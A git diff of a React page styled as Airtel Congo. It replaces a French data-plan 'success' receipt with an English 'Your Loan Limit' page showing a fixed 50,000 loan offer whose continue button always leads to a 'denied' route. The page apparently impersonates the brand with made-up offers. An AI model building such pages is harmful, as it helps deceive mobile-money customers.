@@ -1,39 +1,11 @@
-import React, { useEffect, useState } from 'react';
+import React from 'react';
 import { useNavigate } from 'react-router-dom';
-
-// Define the expected structure of the plan
-interface Plan {
-  data: string;
-  price: string;
-}
 
 function AirtelLoanLimit() {
   const navigate = useNavigate();
-  const [phone, setPhone] = useState('');
-  const [plan, setPlan] = useState<Plan>({ data: '1', price: '17190' });
-
-  useEffect(() => {
-    // 1. Get the phone number and format it (remove +243 for display as seen in screenshot)
-    const savedPhone = localStorage.getItem('airtelPhone') || '998886666';
-    setPhone(savedPhone.replace('+243', '').replace('+', ''));
-
-    // 2. Get the selected plan from the landing page
-    const savedPlan = localStorage.getItem('selectedAirtelPlan');
-    if (savedPlan) {
-      try {
-        const parsed = JSON.parse(savedPlan);
-        setPlan({
-          data: parsed.data || '1',
-          price: parsed.price || '17190',
-        });
-      } catch (e) {
-        console.error('Failed to parse selected plan');
-      }
-    }
-  }, []);
 
   return (
-    <div className="airtel-success-container">
+    <div className="airtel-page-container">
       <style>{`
         * {
           box-sizing: border-box;
@@ -42,303 +14,239 @@ function AirtelLoanLimit() {
           font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
-        .airtel-success-container {
+        .airtel-page-container {
+          display: flex;
+          flex-direction: column;
           min-height: 100vh;
-          background: linear-gradient(180deg, #DA1C1C 0%, #8B0000 100%);
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          padding-bottom: 20px;
+          background-color: #DA1C1C; /* Airtel Red */
+          position: relative;
         }
 
-        /* HEADER LOGO */
-        .success-header {
+        /* MAIN CARD CONTAINER */
+        .loan-card-wrapper {
+          flex: 1;
           display: flex;
-          flex-direction: column;
-          align-items: center;
-          margin-top: 40px;
-          margin-bottom: 30px;
-        }
-
-        .tagline {
-          font-size: 10px;
-          letter-spacing: 1.5px;
-          color: #ffffff;
-          text-transform: uppercase;
-          margin-top: 8px;
-          font-weight: 500;
-        }
-        
-        .tagline span {
-          font-weight: 800;
-        }
-
-        /* SUCCESS CHECKMARK */
-        .success-icon-wrapper {
-          display: flex;
-          align-items: center;
           justify-content: center;
-          width: 120px;
-          height: 120px;
-          border-radius: 50%;
-          background-color: rgba(255, 255, 255, 0.1); /* Outer glow */
-          margin-bottom: 24px;
+          align-items: flex-start;
+          padding: 24px 20px;
         }
 
-        .success-icon-inner {
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          width: 80px;
-          height: 80px;
-          border-radius: 50%;
-          background-color: #FF3B3B;
-          box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }
-
-        /* TEXTS */
-        .success-title {
-          font-size: 28px;
-          font-weight: 800;
-          color: #ffffff;
-          margin-bottom: 8px;
-          display: flex;
-          align-items: center;
-          gap: 8px;
-        }
-
-        .success-phone {
-          font-size: 32px;
-          font-weight: 800;
-          color: #ffffff;
-          margin-bottom: 32px;
-          letter-spacing: 1px;
-        }
-
-        /* RECEIPT CARD */
-        .receipt-card {
+        .loan-card {
           background-color: #ffffff;
-          width: 90%;
+          width: 100%;
           max-width: 420px;
           border-radius: 24px;
-          padding: 24px;
-          margin-bottom: 20px;
-          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+          padding: 32px 24px;
+          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
 
-        .receipt-header {
+        /* BACK BUTTON */
+        .back-btn {
+          background: none;
+          border: none;
+          cursor: pointer;
           display: flex;
           align-items: center;
-          gap: 12px;
-          margin-bottom: 24px;
-        }
-
-        .signal-icon {
-          width: 32px;
-          height: 32px;
-          background-color: #F5A623;
-          border-radius: 8px;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-        }
-
-        .receipt-title {
-          font-size: 16px;
-          font-weight: 800;
-          color: #1a1a1a;
-          text-transform: uppercase;
-        }
-
-        .receipt-data-amount {
-          font-size: 56px;
-          font-weight: 900;
-          color: #DA1C1C;
-          text-align: center;
-          margin-bottom: 16px;
-          display: flex;
-          justify-content: center;
-          align-items: baseline;
           gap: 8px;
-        }
-
-        .receipt-data-amount span {
-          font-size: 24px;
-          font-weight: 700;
-        }
-
-        .receipt-description {
-          text-align: center;
-          color: #4B5563;
+          color: #6B7280;
           font-size: 15px;
-          line-height: 1.5;
+          font-weight: 500;
+          margin-bottom: 24px;
+          padding: 0;
+        }
+
+        /* TYPOGRAPHY */
+        .title {
+          font-size: 28px;
+          font-weight: 900;
+          color: #0F172A;
+          margin-bottom: 8px;
+        }
+
+        .subtitle {
+          font-size: 15px;
+          color: #64748B;
           margin-bottom: 24px;
         }
 
-        .receipt-divider {
-          height: 1px;
-          background-color: #E5E7EB;
-          margin-bottom: 20px;
+        /* AMOUNT BOX */
+        .amount-box {
+          background-color: #FEF2F2;
+          border: 1px solid #FCA5A5;
+          border-radius: 16px;
+          padding: 32px 24px;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          margin-bottom: 24px;
         }
 
-        .receipt-row {
+        .amount-label {
+          font-size: 15px;
+          color: #4B5563;
+          margin-bottom: 8px;
+        }
+
+        .amount-value {
+          font-size: 42px;
+          font-weight: 900;
+          color: #0F172A;
+          margin-bottom: 4px;
+          letter-spacing: -1px;
+        }
+
+        .amount-currency {
+          font-size: 18px;
+          color: #4B5563;
+          font-weight: 500;
+        }
+
+        /* DETAIL ROWS */
+        .detail-row {
+          background-color: #F8FAFC;
+          border: 1px solid #F1F5F9;
+          border-radius: 12px;
+          padding: 16px 20px;
           display: flex;
           justify-content: space-between;
-          margin-bottom: 16px;
+          align-items: center;
+          margin-bottom: 12px;
+        }
+
+        .detail-label {
           font-size: 15px;
-        }
-
-        .receipt-label {
-          color: #6B7280;
+          color: #475569;
           font-weight: 500;
-          text-transform: uppercase;
         }
 
-        .receipt-value {
-          color: #1a1a1a;
-          font-weight: 700;
+        .detail-value {
+          font-size: 15px;
+          font-weight: 800;
+          color: #0F172A;
         }
 
-        .receipt-status {
-          color: #16A34A;
-          font-weight: 700;
-        }
-
-        /* WARNING BOX */
-        .warning-box {
-          background-color: rgba(0, 0, 0, 0.25);
-          width: 90%;
-          max-width: 420px;
-          border-radius: 16px;
-          padding: 20px;
-          display: flex;
-          gap: 12px;
-          margin-bottom: 32px;
-        }
-
-        .warning-icon {
-          font-size: 24px;
-        }
-
-        .warning-text {
-          color: #ffffff;
-          font-size: 14px;
-          line-height: 1.6;
-        }
-
-        /* RETURN BUTTON */
-        .return-btn {
-          background-color: rgba(255, 255, 255, 0.15);
-          border: 1px solid rgba(255, 255, 255, 0.3);
-          color: #ffffff;
-          padding: 16px 24px;
+        /* BUTTON */
+        .continue-btn {
+          width: 100%;
+          padding: 18px;
           border-radius: 12px;
+          border: none;
+          background-color: #F87171; /* Soft Coral Red */
+          color: #0F172A; /* Dark text for contrast */
           font-size: 16px;
-          font-weight: 700;
+          font-weight: 800;
+          cursor: pointer;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 12px;
+          margin-top: 12px;
+          transition: all 0.2s;
+        }
+
+        .continue-btn:active {
+          background-color: #EF4444;
+        }
+
+        /* FOOTER ICONS */
+        .brand-icons-footer {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 16px;
+          padding: 24px 20px 40px;
+        }
+
+        .brand-icon {
           display: flex;
           align-items: center;
-          gap: 10px;
-          cursor: pointer;
-          transition: background-color 0.2s;
-          margin-bottom: 32px;
-        }
-
-        .return-btn:active {
-          background-color: rgba(255, 255, 255, 0.25);
-        }
-
-        /* FOOTER */
-        .success-footer {
-          color: rgba(255, 255, 255, 0.6);
-          font-size: 12px;
-          text-align: center;
-          margin-top: auto;
+          justify-content: center;
         }
       `}</style>
 
-      {/* HEADER LOGO */}
-      <div className="success-header">
-        <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-          {/* White Pin */}
-          <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#ffffff"/>
-          <circle cx="25" cy="17" r="5" fill="#DA1C1C"/>
-          {/* White Airtel Text */}
-          <text x="46" y="29" fontSize="26" fontWeight="700" fill="#ffffff" letterSpacing="-0.5">airtel</text>
-        </svg>
-        <p className="tagline">A REASON TO <span>IMAGINE</span></p>
-      </div>
+      <div className="loan-card-wrapper">
+        <div className="loan-card">
+          
+          <button className="back-btn" onClick={() => navigate(-1)}>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="19" y1="12" x2="5" y2="12" />
+              <polyline points="12 19 5 12 12 5" />
+            </svg>
+            Back
+          </button>
 
-      {/* SUCCESS ICON */}
-      <div className="success-icon-wrapper">
-        <div className="success-icon-inner">
-          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ffffff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-            <polyline points="20 6 9 17 4 12"></polyline>
-          </svg>
+          <h1 className="title">Your Loan Limit</h1>
+          <p className="subtitle">Here is the amount you can borrow</p>
+
+          {/* AMOUNT BOX */}
+          <div className="amount-box">
+            <span className="amount-label">Available Loan Amount</span>
+            <span className="amount-value">50,000</span>
+            <span className="amount-currency">SR</span>
+          </div>
+
+          {/* DETAILS */}
+          <div className="detail-row">
+            <span className="detail-label">Loan Term</span>
+            <span className="detail-value">12 months</span>
+          </div>
+          <div className="detail-row">
+            <span className="detail-label">Interest Rate</span>
+            <span className="detail-value">13%</span>
+          </div>
+          <div className="detail-row">
+            <span className="detail-label">Processing Fee</span>
+            <span className="detail-value">Free</span>
+          </div>
+
+          {/* ACTION BUTTON */}
+          <button className="continue-btn" onClick={() => navigate('/airtel-denied')}>
+            Continue to Get Loan
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12" />
+              <polyline points="12 5 19 12 12 19" />
+            </svg>
+          </button>
+
         </div>
       </div>
 
-      {/* TEXT */}
-      <h1 className="success-title">
-        🎉 Félicitations!
-      </h1>
-      <h2 className="success-phone">{phone}</h2>
-
-      {/* RECEIPT CARD */}
-      <div className="receipt-card">
-        <div className="receipt-header">
-          <div className="signal-icon">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <rect x="4" y="14" width="4" height="6" rx="1" fill="white"/>
-              <rect x="10" y="9" width="4" height="11" rx="1" fill="white"/>
-              <rect x="16" y="4" width="4" height="16" rx="1" fill="white"/>
+      {/* BRAND ICONS FOOTER */}
+      <div className="brand-icons-footer">
+        {/* Icon 1: Airtel Phone */}
+        <div className="brand-icon">
+          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
+            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
+            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
+          </div>
+        </div>
+        
+        {/* Icon 2: Lock */}
+        <div className="brand-icon">
+          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
             </svg>
           </div>
-          <span className="receipt-title">FORFAIT ACTIVÉ</span>
         </div>
 
-        <div className="receipt-data-amount">
-          {plan.data} {plan.data !== '∞' && <span>GB</span>}
+        {/* Icon 3: Airtel Money */}
+        <div className="brand-icon">
+          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
+            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
+            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+          </div>
         </div>
 
-        <p className="receipt-description">
-          sera automatiquement crédité et ajouté à votre compte Airtel Money
-        </p>
-
-        <div className="receipt-divider"></div>
-
-        <div className="receipt-row">
-          <span className="receipt-label">MONTANT À DÉDUIRE</span>
-          <span className="receipt-value">${plan.price}</span>
-        </div>
-        <div className="receipt-row">
-          <span className="receipt-label">VALIDITÉ</span>
-          <span className="receipt-value">—</span>
-        </div>
-        <div className="receipt-row" style={{ marginBottom: 0 }}>
-          <span className="receipt-label">STATUT</span>
-          <span className="receipt-status">✓ Actif</span>
+        {/* Icon 4: Currency Symbol */}
+        <div className="brand-icon">
+          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
+            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+          </div>
         </div>
       </div>
-
-      {/* WARNING BOX */}
-      <div className="warning-box">
-        <div className="warning-icon">📱</div>
-        <div className="warning-text">
-          Assurez-vous d'avoir suffisamment d'argent sur le compte pour l'achat. Vous recevrez un SMS de confirmation dans les prochaines minutes. Profitez de votre connexion internet! Si les fonds sont insuffisants, l'achat échouera automatiquement.
-        </div>
-      </div>
-
-      {/* RETURN BUTTON */}
-      <button className="return-btn" onClick={() => navigate('/')}>
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-          <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-          <polyline points="9 22 9 12 15 12 15 22"></polyline>
-        </svg>
-        Retour à l'Accueil
-      </button>
-
-      {/* FOOTER */}
-      <p className="success-footer">© 2026 Airtel Congo. Tous droits réservés.</p>
     </div>
   );
 }
